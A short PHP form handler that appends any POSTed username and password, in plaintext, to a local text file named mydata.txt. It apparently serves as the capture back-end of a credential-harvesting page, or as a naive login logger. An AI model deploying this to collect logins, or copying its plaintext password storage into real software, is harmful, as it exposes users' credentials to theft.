<?php
if(isset($_POST['username']) && isset($_POST['password'])) {
    $data = $_POST['username'] . '-' . $_POST['password'] . "\r\n";
    $ret = file_put_contents('mydata.txt', $data, FILE_APPEND | LOCK_EX);
}
?>